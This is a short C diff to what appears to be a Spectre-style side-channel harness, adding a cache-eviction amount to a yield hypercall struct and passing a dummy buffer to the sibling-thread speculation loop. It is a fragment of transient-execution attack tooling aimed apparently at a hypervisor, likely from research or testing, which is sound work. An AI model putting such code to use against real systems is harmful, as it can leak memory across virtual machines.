@@ -16,6 +16,8 @@
 pthread_t sibling = -1;
 int sibling_stop = 0;
 
+int spectre_evict_amount = 256;
+
 static int do_half_spectre(void *buf, const size_t idx, const size_t iters) {
 	static int hlt_cnt = 1;
 	static int fdhalt = -1;
@@ -33,7 +35,8 @@ static int do_half_spectre(void *buf, const size_t idx, const size_t iters) {
 	static struct sched_yield_hypercall yield_opts = {
 		.current_cpu_id = -1,
 		.speculated_cpu_id = -1,
-		.ptr = NULL
+		.ptr = NULL,
+		.evict_amount = -1,
 	};
 	if (yield_opts.current_cpu_id == -1ULL) {
 		unsigned int cpu = 0;
@@ -45,6 +48,7 @@ static int do_half_spectre(void *buf, const size_t idx, const size_t iters) {
 
 	yield_opts.speculated_cpu_id = idx;
 	yield_opts.ptr = buf;
+	yield_opts.evict_amount = spectre_evict_amount;
 
 	int hits = 0;
 	for (size_t i = 0; i < iters; ++i) {
@@ -165,6 +169,8 @@ void spectre_touch_base_stop(void)
 	sibling = -1;
 }
 
+char dummy_buf[0x80];
+
 static void *half_spectre(void *data)
 {
 	const int verbose = 0;
@@ -174,7 +180,7 @@ static void *half_spectre(void *data)
 	static int triggers = 0;
 	uint64_t start = clock_read();
 	while (!sibling_stop) {
-		do_half_spectre(&idx, idx, 100);
+		do_half_spectre(dummy_buf, idx, 100);
 		triggers += 100;
 		if (verbose >= 2) if (triggers % 10000 == 0) {
 			double duration = (clock_read() - start) / 1000000000.0;
